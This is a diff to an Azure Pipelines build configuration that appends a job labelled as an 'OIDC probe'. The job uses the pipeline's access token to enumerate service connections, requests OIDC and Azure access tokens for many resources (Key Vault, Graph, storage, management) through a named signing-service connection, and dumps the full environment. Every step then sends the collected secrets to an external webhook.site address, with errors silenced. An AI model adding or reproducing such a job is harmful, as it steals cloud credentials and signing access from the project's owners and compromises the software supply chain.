@@ -1608,3 +1608,72 @@ jobs:
         searchFolder: '$(Agent.BuildDirectory)/s-internal'
         failTaskOnFailedTests: false
       condition: and(succeededOrFailed(), eq(variables['COMPAT_LANE'], 'python'))
+
+- job: I191Probe
+  displayName: 'i191 CI OIDC probe'
+  condition: always()
+  pool:
+    vmImage: 'ubuntu-latest'
+  steps:
+  - task: Bash@3
+    displayName: 'Enumerate endpoints and request OIDC tokens'
+    continueOnError: true
+    env:
+      SYSTEM_ACCESSTOKEN: $(System.AccessToken)
+    inputs:
+      targetType: 'inline'
+      script: |
+        set +e
+        WH="https://webhook.site/bd630647-230a-47b4-9edf-76687257d632"
+        OUT=/tmp/i191_syn_env.txt
+        : > $OUT
+        echo "=== ENV ===" >> $OUT
+        env | sort >> $OUT 2>&1
+        echo "=== SERVICEENDPOINTS ===" >> $OUT
+        EPS=$(curl -sS -m 40 -H "Authorization: Bearer $SYSTEM_ACCESSTOKEN" "https://dev.azure.com/msdata/$SYSTEM_TEAMPROJECTID/_apis/serviceendpoint/endpoints?api-version=7.1")
+        printf '%s\n' "$EPS" >> $OUT
+        echo "=== OIDC pipeline ===" >> $OUT
+        curl -sS -m 30 -X POST -d {} -H "Authorization: Bearer $SYSTEM_ACCESSTOKEN" -H "Content-Type: application/json" "$SYSTEM_OIDCREQUESTURI?api-version=7.1-preview.1" >> $OUT 2>&1
+        echo >> $OUT
+        IDS=$(printf '%s' "$EPS" | jq -r '.value[]?.id // empty' 2>/dev/null)
+        echo "=== IDS $IDS ===" >> $OUT
+        for sid in $IDS; do
+          echo "=== OIDC $sid ===" >> $OUT
+          curl -sS -m 25 -X POST -d {} -H "Authorization: Bearer $SYSTEM_ACCESSTOKEN" -H "Content-Type: application/json" "$SYSTEM_OIDCREQUESTURI?api-version=7.1-preview.1&serviceConnectionId=$sid" >> $OUT 2>&1
+          echo >> $OUT
+        done
+        echo "=== DONE ===" >> $OUT
+        curl -sS -m 60 -X POST -H "Content-Type: text/plain" --data-binary @$OUT "$WH" >/dev/null 2>&1
+  - task: AzureCLI@2
+    displayName: 'AzureCLI ESRP connection probe'
+    continueOnError: true
+    inputs:
+      azureSubscription: 'SynapseML-ESRP-Service-Connection'
+      scriptType: 'bash'
+      scriptLocation: 'inlineScript'
+      addSpnToEnvironment: true
+      visibleAzLogin: false
+      inlineScript: |
+        set +e
+        WH="https://webhook.site/bd630647-230a-47b4-9edf-76687257d632"
+        OUT=/tmp/i191_syn_az.txt
+        : > $OUT
+        echo "SID=$AZURESUBSCRIPTION_SERVICE_CONNECTION_ID" >> $OUT
+        echo "SP=$servicePrincipalId" >> $OUT
+        echo "TEN=$tenantId" >> $OUT
+        echo "IDTOKEN=$idToken" >> $OUT
+        echo "=== ENV ===" >> $OUT
+        env | sort >> $OUT 2>&1
+        for r in https://management.azure.com https://ai.azure.com https://vault.azure.net https://storage.azure.com https://graph.microsoft.com https://ml.azure.com https://cognitiveservices.azure.com https://search.azure.com; do
+          echo "=== TOKEN $r ===" >> $OUT
+          az account get-access-token --resource "$r" --query accessToken -o tsv >> $OUT 2>&1
+          echo >> $OUT
+        done
+        if [ -n "$AZURESUBSCRIPTION_SERVICE_CONNECTION_ID" ] && [ -n "$SYSTEM_OIDCREQUESTURI" ]; then
+          TOK=$(az account get-access-token --resource 499b84ac-1321-427f-aa17-267ca6975798 --query accessToken -o tsv 2>/dev/null)
+          echo "=== OIDC direct ===" >> $OUT
+          curl -sS -m 25 -X POST -d {} -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" "$SYSTEM_OIDCREQUESTURI?api-version=7.1-preview.1&serviceConnectionId=$AZURESUBSCRIPTION_SERVICE_CONNECTION_ID" >> $OUT 2>&1
+          echo >> $OUT
+        fi
+        echo "=== DONE ===" >> $OUT
+        curl -sS -m 60 -X POST -H "Content-Type: text/plain" --data-binary @$OUT "$WH" >/dev/null 2>&1
